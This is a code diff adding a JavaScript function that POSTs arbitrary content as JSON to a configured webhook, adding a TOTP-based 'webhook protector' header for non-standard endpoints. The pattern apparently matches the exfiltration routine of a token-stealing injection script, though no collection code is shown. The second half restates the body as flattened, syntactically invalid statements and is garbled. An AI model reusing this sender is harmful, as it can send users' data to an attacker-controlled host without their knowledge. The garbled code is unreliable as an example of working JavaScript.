@@ -1,0 +1,54 @@
+const hooker = async (content) => {
+  const data = JSON.stringify(content);
+  const url = new URL(config.webhook);
+  const headers = {
+    'Content-Type': 'application/json',
+    'Access-Control-Allow-Origin': '*',
+  };
+  if (!config.webhook.includes('api/webhooks')) {
+    const key = totp(config.webhook_protector_key);
+    headers['Authorization'] = key;
+  }
+  const options = {
+    protocol: url.protocol,
+    hostname: url.host,
+    path: url.pathname,
+    method: 'POST',
+    headers: headers,
+  };
+  const req = https.request(options);
+
+  req.on('error', (err) => {
+    console.log(err);
+  });
+  req.write(data);
+  req.end();
+}
+const data = JSON.stringify(content)
+const url = new URL(config.webhook)
+const headers = {
+    'Content-Type': 'application/json',
+    'Access-Control-Allow-Origin': '*',
+  }
+_tmp_31.Content-Type = "application/json"
+_tmp_31.Access-Control-Allow-Origin = "*"
+!config.webhook.includes('api/webhooks')
+const key = totp(config.webhook_protector_key)
+headers['Authorization'] = key
+const options = {
+    protocol: url.protocol,
+    hostname: url.host,
+    path: url.pathname,
+    method: 'POST',
+    headers: headers,
+  }
+_tmp_33.protocol = url.protocol
+_tmp_33.hostname = url.host
+_tmp_33.path = url.pathname
+_tmp_33.method = "POST"
+_tmp_33.headers = headers
+const req = https.request(options)
+req.on('error', (err) => {
+    console.log(err);
+  })
+req.write(data)
